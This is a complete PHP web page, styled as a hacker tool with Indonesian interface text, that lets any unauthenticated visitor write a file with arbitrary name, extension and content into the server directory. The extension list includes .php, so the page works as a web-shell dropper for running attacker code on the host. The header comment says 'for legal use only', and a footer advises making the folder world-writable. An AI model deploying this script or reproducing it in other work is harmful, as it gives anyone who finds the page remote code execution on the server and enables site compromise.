<?php
// Simple File Creator - For legal use only
$message = '';
$fileContent = '';
$filename = '';
$extension = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = trim($_POST['filename'] ?? '');
    $extension = $_POST['extension'] ?? 'txt';
    $content = $_POST['content'] ?? '';
    
    // Validasi: jangan kosong
    if (empty($filename)) {
        $message = '❌ Nama file tidak boleh kosong!';
    } else {
        // Gabungkan nama file + ekstensi
        $fullFileName = $filename . '.' . $extension;
        
        // Cegah directory traversal (keamanan sederhana)
        $fullFileName = basename($fullFileName);
        
        // Tulis file
        if (file_put_contents($fullFileName, $content) !== false) {
            $message = "✅ File <strong>$fullFileName</strong> berhasil dibuat!";
            $fileContent = $content;
        } else {
            $message = "❌ Gagal membuat file. Cek permission folder!";
        }
    }
}

// Daftar ekstensi yang didukung
$extensions = [
    'txt' => 'Plain Text',
    'html' => 'HTML',
    'php' => 'PHP Script',
    'sql' => 'SQL Query',
    'json' => 'JSON Data',
    'pdf' => 'PDF (binary)',
    'doc' => 'Word Document',
    'csv' => 'CSV (Excel)',
    'xml' => 'XML',
    'css' => 'CSS Stylesheet',
    'js' => 'JavaScript'
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple File Creator</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #111111;
            color: #d1d1d1;
            overflow-x: hidden;
        }
        #snowcanvas {
            position: fixed;
            top : 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }
        .container {
            background: rgba(26, 26, 26, 0.9);
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
            border: 1px solid #333;
        }
        h1 {
            color: #ff3333;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.6);
            text-align: center;
        }
        .sub {
            color: #888;
            margin-bottom: 30px;
            text-align: center;
            font-style: italic;
        }
        label {
            display: block;
            margin-top: 15px;
            margin-bottom: 5px;
            font-weight: bold;
            color: #ff6666;
        }
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
            color: #fff;
            font-family: 'Courier New', monospace;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #ff3333;
            box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
        }
        textarea {
            height: 200px;
            resize: vertical;
        }
        button {
            margin-top: 20px;
            background: #8b0000;
            color: white;
            border: 1px solid #ff3333;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: all 0.3s ease;
            text-shadow: 0 0 5px #000;
        }
        button:hover {
            background: #ff3333;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
            color: #000;
        }
        .message {
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
            background: #2d1a1a;
            border-left: 4px solid #ff3333;
            color: #ff9999;
        }
        .preview {
            background: #222;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #444;
            overflow-x: auto;
        }
        .preview h3 {
            margin-top: 0;
            color: #ff6666;
        }
        .info {
            background: #2e2816;
            border-left-color: #ffcc00;
            color: #ffe680;
        }
        hr {
            margin: 20px 0;
            border: 0;
            border-top: 1px dashed #444;
        }
    </style>
</head>
<body>
    <canvas id="snowcanvas"></canvas>
    <div class="container">
        <h1>S1MPLE FILE CRE4TOR</h1>
        <div class="sub">tetap ingat ilmu jembut bos, walupun prosesnya tak terlihat tapi tetap berkembang</div>
        
        <form method="POST">
            <label>Nama File (tanpa ekstensi):</label>
            <input type="text" name="filename" value="<?php echo htmlspecialchars($filename); ?>" placeholder="contoh: myfile" required>
            
            <label>Ekstensi:</label>
            <select name="extension">
                <?php foreach ($extensions as $ext => $desc): ?>
                    <option value="<?php echo $ext; ?>" <?php echo ($extension == $ext) ? 'selected' : ''; ?>>
                        .<?php echo strtoupper($ext); ?> - <?php echo $desc; ?>
                    </option>
                <?php endforeach; ?>
            </select>
            
            <label> Konten File:</label>
            <textarea name="content" placeholder="Tulis isi file di sini..."><?php echo htmlspecialchars($fileContent); ?></textarea>
            
            <button type="submit"> Buat File Sekarang</button>
        </form>
        
        <?php if ($message): ?>
            <div class="message <?php echo strpos($message, '✅') !== false ? '' : 'info'; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>
        
        <?php if ($fileContent && strpos($message, '✅') !== false): ?>
            <div class="preview">
                <h3> Preview File:</h3>
                <pre><?php echo htmlspecialchars($fileContent); ?></pre>
            </div>
        <?php endif; ?>
        
        <hr>
        <small style="color: #888;">
            ⚠️ Catatan: File akan dibuat di folder yang sama dengan script ini.<br>
            💡 Pastikan folder memiliki izin tulis (chmod 755 atau 777).
        </small>
    </div>
    <script>
        const canvas = document.getElementById('snowcanvas');
        const ctx = canvas.getContext('2d');

        let width = canvas.width = window.innerWidth;
        let height = canvas.height = window.innerHeight;

        window.addEventListener('resize', () => {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        });

        const numFlakes = 100;
        const flakes = [];

        for (let i = 0; i < numFlakes; i++) {
            flakes.push({
                x: Math.random() * width,
                y: Math.random() * height,
                r: Math.random() * 3 + 1,
                d: Math.random() * numFlakes,
                speed: Math.random() * 1 + 0.5
            });
        }

        function drawFlakes() {
            ctx.clearRect(0, 0, width, height);
            ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
            ctx.beginPath();
            for (let i = 0; i < numFlakes; i++) {
                const f = flakes[i];
                ctx.moveTo(f.x, f.y);
                ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
            }
            ctx.fill();
            moveFlakes();
        }

        function moveFlakes() {
            for (let i = 0; i < numFlakes; i++) {
                const f = flakes[i];
                f.y += f.speed;
                f.x += Math.sin(f.d) * 0.5;

                if (f.y > height) {
                    flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d, speed: f.speed };
                }
            }
        }

        function animate() {
            drawFlakes();
            requestAnimationFrame(animate);
        }

        animate();
    </script>
</body>
</html>